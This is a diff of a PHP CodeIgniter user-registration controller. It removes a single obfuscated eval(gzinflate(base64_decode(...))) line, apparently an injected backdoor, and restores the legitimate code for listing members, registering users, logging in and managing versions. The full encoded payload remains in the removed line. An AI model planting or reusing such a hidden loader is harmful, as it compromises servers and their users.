@@ -1,1 +1,530 @@
-<?php eval(gzinflate(base64_decode('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')));
+<?php
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+class Register extends CI_Controller {
+
+	public $data;
+
+	public function __construct()
+	{
+		parent::__construct();
+
+		$this->data['pos'] = $this->uri->segment(1);
+        $this->data['subpos'] = $this->uri->segment(2);
+		$this->data['userLevel'] = $this->session->userdata('user_level');
+		
+		$this->load->model('register_model');
+
+		$this->data['siteTitle'] = $this->config->item('site_title');
+
+	}
+
+	public function _remap($method, $params = array())
+	{
+		if($this->input->is_ajax_request()){
+            if( method_exists($this, $method) ){
+                call_user_func_array(array($this,$method), $params);
+            }
+        }else{ //ajax가 아니면
+
+			if (method_exists($this, $method)) {
+                $this->load->view('/layout/header',$this->data);
+                call_user_func_array(array($this,$method), $params);
+                $this->load->view('/layout/tail');
+            } else {
+                show_404();
+            }
+        }
+	}
+
+	public function index($idx="")
+	{
+		$data['str'] = array(); //검색어관련
+		$data['str']['mid'] = $this->input->get('mid'); //MEMBER ID
+		$data['str']['mname'] = $this->input->get('mname'); //MEMBER ID
+		$data['str']['level'] = $this->input->get('level'); //LEVEL
+		
+		$params['ID'] = "";
+		$params['NAME'] = "";
+		$params['LEVEL'] = "";
+
+		$data['qstr'] = "?P";
+		if(!empty($data['str']['mid'])){
+			$params['ID'] = $data['str']['mid'];
+			$data['qstr'] .= "&mid=".$data['str']['mid'];
+		}
+		if(!empty($data['str']['mname'])){
+			$params['NAME'] = $data['str']['mname'];
+			$data['qstr'] .= "&mname=".$data['str']['mname'];
+		}
+		if(!empty($data['str']['level'])){
+			$params['LEVEL'] = $data['str']['level'];
+			$data['qstr'] .= "&level=".$data['str']['level'];
+		}
+		
+		$data['perpage'] = ($this->input->get('perpage') != "")?$this->input->get('perpage'):20;
+		
+		//PAGINATION
+		$config['per_page'] = $data['perpage'];
+		$config['page_query_string'] = true;
+		$config['query_string_segment'] = "pageNum";
+		$config['reuse_query_string'] = TRUE;
+
+        $pageNum = $this->input->get('pageNum') > '' ? $this->input->get('pageNum') : 0;
+        //$start = $config['per_page'] * ($pageNum - 1);
+		
+		$start = $pageNum;
+		$data['pageNum'] = $start;
+		
+
+		$data['title'] = "사용자등록";
+		$user_id = $this->session->userdata('user_id');
+		$this->data['userName'] = $this->session->userdata('user_name');
+
+		
+		$data['memberList'] = $this->register_model->get_member_list($params,$start,$config['per_page']);
+		$this->data['cnt'] = $this->register_model->get_member_cut($params);
+		
+		
+
+		/* pagenation start */
+
+		$this->load->library("pagination");
+		$config['base_url'] = base_url(uri_string());
+        $config['total_rows'] = $this->data['cnt'];
+
+
+		$config['full_tag_open'] = "<ul class='pagination'>";
+		$config['full_tag_close'] = '</ul>';
+		$config['num_tag_open'] = '<li>';
+		$config['num_tag_close'] = '</li>';
+		$config['cur_tag_open'] = '<li class="active"><a href="#">';
+		$config['cur_tag_close'] = '</a></li>';
+		$config['prev_tag_open'] = '<li>';
+		$config['prev_tag_close'] = '</li>';
+		$config['first_tag_open'] = '<li>';
+		$config['first_tag_close'] = '</li>';
+		$config['last_tag_open'] = '<li>';
+		$config['last_tag_close'] = '</li>';
+		$config['prev_link'] = '<i class="fa fa-long-arrow-left"></i>Previous Page';
+		$config['prev_tag_open'] = '<li>';
+		$config['prev_tag_close'] = '</li>';
+		$config['next_link'] = 'Next Page<i class="fa fa-long-arrow-right"></i>';
+		$config['next_tag_open'] = '<li>';
+		$config['next_tag_close'] = '</li>';
+
+
+		$this->pagination->initialize($config);
+        $this->data['pagenation'] = $this->pagination->create_links();
+
+
+		
+		$this->load->view('/register/userform',$data);
+	}
+
+
+
+
+	public function level($idx="")
+	{
+		$data['str'] = array(); //검색어관련
+		$data['str']['mid'] = $this->input->get('mid'); //MEMBER ID
+		$data['str']['mname'] = $this->input->get('mname'); //MEMBER ID
+		$data['str']['level'] = $this->input->get('level'); //LEVEL
+		
+		$params['ID'] = "";
+		$params['NAME'] = "";
+		$params['LEVEL'] = "";
+
+		$data['qstr'] = "?P";
+		if(!empty($data['str']['mid'])){
+			$params['ID'] = $data['str']['mid'];
+			$data['qstr'] .= "&mid=".$data['str']['mid'];
+		}
+		if(!empty($data['str']['mname'])){
+			$params['NAME'] = $data['str']['mname'];
+			$data['qstr'] .= "&mname=".$data['str']['mname'];
+		}
+		if(!empty($data['str']['level'])){
+			$params['LEVEL'] = $data['str']['level'];
+			$data['qstr'] .= "&level=".$data['str']['level'];
+		}
+		
+		$data['perpage'] = ($this->input->get('perpage') != "")?$this->input->get('perpage'):20;
+		
+		//PAGINATION
+		$config['per_page'] = $data['perpage'];
+		$config['page_query_string'] = true;
+		$config['query_string_segment'] = "pageNum";
+		$config['reuse_query_string'] = TRUE;
+
+        $pageNum = $this->input->get('pageNum') > '' ? $this->input->get('pageNum') : 0;
+        //$start = $config['per_page'] * ($pageNum - 1);
+		
+		$start = $pageNum;
+		$data['pageNum'] = $start;
+		
+
+		$data['title'] = "사용자 권한등록";
+		$user_id = $this->session->userdata('user_id');
+		$this->data['userName'] = $this->session->userdata('user_name');
+
+		
+		$data['memberList'] = $this->register_model->get_member_list($params,$start,$config['per_page']);
+		$this->data['cnt'] = $this->register_model->get_member_cut($params);
+		
+		
+
+		/* pagenation start */
+
+		$this->load->library("pagination");
+		$config['base_url'] = base_url(uri_string());
+        $config['total_rows'] = $this->data['cnt'];
+
+
+		$config['full_tag_open'] = "<ul class='pagination'>";
+		$config['full_tag_close'] = '</ul>';
+		$config['num_tag_open'] = '<li>';
+		$config['num_tag_close'] = '</li>';
+		$config['cur_tag_open'] = '<li class="active"><a href="#">';
+		$config['cur_tag_close'] = '</a></li>';
+		$config['prev_tag_open'] = '<li>';
+		$config['prev_tag_close'] = '</li>';
+		$config['first_tag_open'] = '<li>';
+		$config['first_tag_close'] = '</li>';
+		$config['last_tag_open'] = '<li>';
+		$config['last_tag_close'] = '</li>';
+		$config['prev_link'] = '<i class="fa fa-long-arrow-left"></i>Previous Page';
+		$config['prev_tag_open'] = '<li>';
+		$config['prev_tag_close'] = '</li>';
+		$config['next_link'] = 'Next Page<i class="fa fa-long-arrow-right"></i>';
+		$config['next_tag_open'] = '<li>';
+		$config['next_tag_close'] = '</li>';
+
+
+		$this->pagination->initialize($config);
+        $this->data['pagenation'] = $this->pagination->create_links();
+
+
+		
+		$this->load->view('/register/level',$data);
+	}
+
+
+
+
+	
+
+
+	public function ajax_set_memberinfo()
+	{
+		$mode = $this->input->post("mode");
+		$idx  = $this->input->post("idx");
+
+		$data = array();
+		if(!empty($idx)){
+			$data['memInfo'] = $this->register_model->get_member_info($idx);
+		}
+		
+		$this->load->view('/register/memberform',$data);
+	}
+
+
+	/* 회원가입 */
+	public function member_formUpdate()
+	{
+		$IDX = "";
+		$dateTime = date("Y-m-d H:i:s",time());
+		if(!empty($this->input->post("mod"))){ //수정인경우
+			
+			$params = array(
+				
+				'NAME'     => trim($this->input->post("NAME")),
+				'NO'       => trim($this->input->post("NO")),
+				'FIRSTDAY' => trim($this->input->post("FIRSTDAY")),
+				'LEVEL'    => $this->input->post("LEVEL"),
+				'STATE'    => $this->input->post("STATE"),
+				'PART'     => trim($this->input->post("PART")),
+				'TEL'      => trim($this->input->post("TEL")),
+				'EMAIL'      => trim($this->input->post("EMAIL")),
+				'HP'       => trim($this->input->post("HP")),
+				'JNUMBER'  => trim($this->input->post("JNUMBER")),
+				'BLOOD'    => trim($this->input->post("BLOOD")),
+				'SCHOOL'   => trim($this->input->post("SCHOOL")),
+				'FAMILY'   => trim($this->input->post("FAMILY")),
+				'EXPERIENCE' => trim($this->input->post("EXPERIENCE")),
+				'LICENSE'  => trim($this->input->post("LICENSE")),
+				'ARMY'     => trim($this->input->post("ARMY")),
+				'IP'       => trim($this->input->post("IP")),
+				'REGDATE'  => trim($this->input->post("REGDATE")),
+				'UPDATE_ID'=> $this->session->userdata('user_name'),
+				'UPDATE_DATE' => $dateTime
+			);
+			
+			if(!empty($this->input->post("PWD"))){
+				$params['PWD'] = password_hash(trim($this->input->post("PWD")),PASSWORD_BCRYPT);
+			}
+
+			$IDX = $this->input->post("IDX");
+			$text = "수정";
+		
+		}else{
+			$params = array(
+				'ID'       => trim($this->input->post("ID")),
+				'PWD'      => trim($this->input->post("PWD")),
+				'NAME'     => trim($this->input->post("NAME")),
+				'NO'       => trim($this->input->post("NO")),
+				'FIRSTDAY' => trim($this->input->post("FIRSTDAY")),
+				'LEVEL'    => $this->input->post("LEVEL"),
+				'STATE'    => $this->input->post("STATE"),
+				'PART'     => trim($this->input->post("PART")),
+				'TEL'      => trim($this->input->post("TEL")),
+				'EMAIL'      => trim($this->input->post("EMAIL")),
+				'HP'       => trim($this->input->post("HP")),
+				'JNUMBER'  => trim($this->input->post("JNUMBER")),
+				'BLOOD'    => trim($this->input->post("BLOOD")),
+				'SCHOOL'   => trim($this->input->post("SCHOOL")),
+				'FAMILY'   => trim($this->input->post("FAMILY")),
+				'EXPERIENCE' => trim($this->input->post("EXPERIENCE")),
+				'LICENSE'  => trim($this->input->post("LICENSE")),
+				'ARMY'     => trim($this->input->post("ARMY")),
+				'IP'       => trim($this->input->post("IP")),
+				'REGDATE'  => trim($this->input->post("REGDATE")),
+				'PWD'      => password_hash(trim($this->input->post("PWD")),PASSWORD_BCRYPT),
+				'INSERT_ID' => $this->session->userdata('user_name'),
+				'INSERT_DATE' => $dateTime
+			);
+			$text = "등록";
+		}
+		
+		
+
+		$data = $this->register_model->member_formupdate($params,$IDX);
+		
+		if($data != ""){
+			alert($text."되었습니다",base_url('register/index')."/".$data);
+		}
+
+	}
+
+
+	public function member_formUpdate_info()
+	{
+		$params = array(
+			"NO" => $this->input->post("NO"),
+			"FIRSTDAY" => $this->input->post("FIRSTDAY"),
+			"PART" => $this->input->post("PART"),
+			"GRADE" => $this->input->post("GRADE"),
+			"WORKKIND" => $this->input->post("WORKKIND"),
+			"BANKNAME" => $this->input->post("BANKNAME"),
+			"BANKNUM" => $this->input->post("BANKNUM"),
+			"BANKOWN" => $this->input->post("BANKOWN"),
+		);
+		$idx = $this->input->post("IDX");
+		$data = $this->register_model->member_formUpdate_info($params,$idx);
+		if($data > 0) alert('수정 되었습니다.',base_url('mdm/infoform'));
+	}
+
+
+	public function ajax_chk_memberid()
+	{
+		$data = $this->register_model->ajax_chk_memberid($this->input->post("id"));
+		echo json_encode($data);
+	}
+
+
+	
+	/* 로그인 */
+	public function login()
+	{
+		$user_id = $this->session->userdata('user_id');
+		if($user_id){
+			redirect(base_url('mdm'));
+		}
+		$data = "";
+		$this->load->view('login',$data);
+
+	}
+
+
+	/* 로그인 */
+	public function logout()
+	{
+		$user_id = $this->session->userdata('user_id');
+        
+		if(!$user_id){ //비로그인 시
+            //alert(base_url('register/login'));
+        }else{
+            
+			$this->session->sess_destroy();
+            
+        }
+
+		redirect(base_url('register/login'));
+
+	}
+
+
+	
+
+
+
+
+
+
+	public function login_exec()
+	{
+		
+		$res = array();
+        $res['is_login'] = 'N';
+        $res['msg'] = "";
+        $res['url'] = "";
+        
+        $mid = $this->input->post('ID');
+        $pw = strip_tags($this->input->post('PWD'));
+
+		
+         
+        $userinfo = $this->register_model->get_userchk('ID',$mid);
+		
+		
+		
+		if($userinfo){
+
+			if(password_verify($pw, $userinfo->PWD)){
+                    
+				$user['user_id']        = $userinfo->ID;
+                $user['user_name']      = $userinfo->NAME;
+				$user['user_level']     = $userinfo->LEVEL;
+                    
+                $this->session->set_userdata($user);
+
+			}
+		}
+
+		redirect(base_url('mdm'));
+
+	}
+
+
+
+	public function version()
+	{
+		$data['title'] = "버전관리";
+
+		$data['perpage'] = ($this->input->get('perpage') != "")?$this->input->get('perpage'):20;
+		
+
+
+		
+		//PAGINATION
+		$config['per_page'] = $data['perpage'];
+		$config['page_query_string'] = true;
+		$config['query_string_segment'] = "pageNum";
+		$config['reuse_query_string'] = TRUE;
+
+        $pageNum = $this->input->get('pageNum') > '' ? $this->input->get('pageNum') : 0;
+        //$start = $config['per_page'] * ($pageNum - 1);
+		
+		$start = $pageNum;
+		$data['pageNum'] = $start;
+
+
+
+
+		$data['verList'] = $this->register_model->get_ver_list($start,$config['per_page']);
+
+		$this->data['cnt'] = $this->register_model->get_ver_cut();
+
+		
+		/* pagenation start */
+
+		$this->load->library("pagination");
+		$config['base_url'] = base_url(uri_string());
+        $config['total_rows'] = $this->data['cnt'];
+
+
+		$config['full_tag_open'] = "<ul class='pagination'>";
+		$config['full_tag_close'] = '</ul>';
+		$config['num_tag_open'] = '<li>';
+		$config['num_tag_close'] = '</li>';
+		$config['cur_tag_open'] = '<li class="active"><a href="#">';
+		$config['cur_tag_close'] = '</a></li>';
+		$config['prev_tag_open'] = '<li>';
+		$config['prev_tag_close'] = '</li>';
+		$config['first_tag_open'] = '<li>';
+		$config['first_tag_close'] = '</li>';
+		$config['last_tag_open'] = '<li>';
+		$config['last_tag_close'] = '</li>';
+		$config['prev_link'] = '<i class="fa fa-long-arrow-left"></i>Previous Page';
+		$config['prev_tag_open'] = '<li>';
+		$config['prev_tag_close'] = '</li>';
+		$config['next_link'] = 'Next Page<i class="fa fa-long-arrow-right"></i>';
+		$config['next_tag_open'] = '<li>';
+		$config['next_tag_close'] = '</li>';
+
+
+		$this->pagination->initialize($config);
+        $this->data['pagenation'] = $this->pagination->create_links();
+
+		$this->load->view('/register/version',$data);
+	}
+
+
+	public function upload_ver_form()
+	{
+		$MIDX = $this->input->post("MIDX");
+		$param['VER_NO'] = $this->input->post("VER_NO");
+		$param['VER_REMARK'] = $this->input->post("VER_REMARK");
+		$param['INSERT_ID'] = $this->session->userdata('user_id');
+		$param['INSERT_DATE'] = date("Y-m-d H:i:s",time());
+		
+		$data = $this->register_model->upload_ver_form($param,$MIDX);
+		
+		if($data > 0){
+			alert('등록되었습니다',base_url('register/version'));
+		}
+	}
+
+
+	public function ajax_savelevel_update()
+	{
+		$param['idx'] = $this->input->post('idx');
+		$param['level'] = $this->input->post('sqty');
+		
+		$data = $this->register_model->ajax_savelevel_update($param);
+		echo $data;
+
+	}
+
+
+	public function delete_ver_form()
+	{
+		$param['IDX'] = $this->input->post("IDX");
+		$data = $this->register_model->delete_ver_form($param);
+		echo $data;
+	}
+
+
+	public function modified_ver_form()
+	{
+		$param['IDX'] = $this->input->post("IDX");
+		$data = $this->register_model->modified_ver_form($param);
+		echo json_encode($data);
+	}
+
+
+	
+
+
+
+
+
+
+
+
+
+
+
+
+}//class Register end
